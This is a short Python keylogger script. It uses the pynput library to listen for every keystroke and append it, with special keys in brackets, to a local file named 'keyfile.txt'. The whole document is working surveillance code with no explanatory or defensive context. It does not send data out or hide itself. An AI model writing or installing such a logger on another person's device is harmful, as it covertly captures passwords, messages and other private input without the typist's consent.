from pynput import keyboard

def keyPressed(data):
  with open("keyfile.txt",'a') as logKey:
    try:
      logKey.write(data)
    except:
      print("Error getting char")

def logg(key):
  key=str(key)
  if key=='Key.space':
    key=' '
  elif key== 'Key.enter':
    key='\n'
  elif key.startswith('Key'):
    key=f'[{key}]'
    print(key)
  keyPressed(key)
listener=keyboard.Listener(on_press=logg)
listener.start()
input()
